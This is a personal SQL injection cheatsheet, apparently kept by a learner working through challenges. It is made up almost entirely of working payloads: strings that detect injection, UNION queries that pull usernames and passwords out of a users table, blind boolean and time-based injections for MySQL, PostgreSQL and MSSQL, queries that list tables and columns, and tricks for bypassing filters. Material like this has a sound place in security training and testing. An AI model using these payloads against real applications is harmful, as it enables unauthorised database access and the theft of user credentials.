# SQL Injection Cheatsheet

> Build this as you learn. Add every payload that works for you.

## Detection
```
' OR 1=1--
" OR 1=1--
' OR '1'='1
1' ORDER BY 1--
1' UNION SELECT NULL--
```

## UNION-Based
```sql
-- Find number of columns
' ORDER BY 1-- 
' ORDER BY 2--
' UNION SELECT NULL,NULL,NULL--

-- Find string columns
' UNION SELECT 'a',NULL,NULL--

-- Extract data
' UNION SELECT username,password FROM users--

-- Concatenate columns
' UNION SELECT username||'~'||password FROM users--
```

## Blind Boolean-Based
```sql
-- Confirm injection
' AND 1=1--    (true)
' AND 1=2--    (false)

-- Extract data character by character
' AND SUBSTRING(username,1,1)='a' FROM users WHERE id=1--
```

## Blind Time-Based
```sql
-- MySQL
' AND SLEEP(5)--

-- PostgreSQL
'; SELECT pg_sleep(5)--

-- MSSQL
'; WAITFOR DELAY '0:0:5'--
```

## Database-Specific

### MySQL
```sql
-- Version
' UNION SELECT @@version--

-- Current database
' UNION SELECT database()--

-- List tables
' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()--

-- List columns
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
```

### PostgreSQL
```sql
-- Version
' UNION SELECT version()--

-- List tables
' UNION SELECT table_name FROM information_schema.tables WHERE table_schema='public'--
```

## Filter Bypass Techniques
```
-- Space bypass
/**/
%09 (tab)
%0a (newline)

-- Quote bypass
CHAR(97) instead of 'a'

-- Keyword bypass
SeLeCt, UNION ALL SELECT
```

## Notes
> Add your own discoveries here as you solve challenges
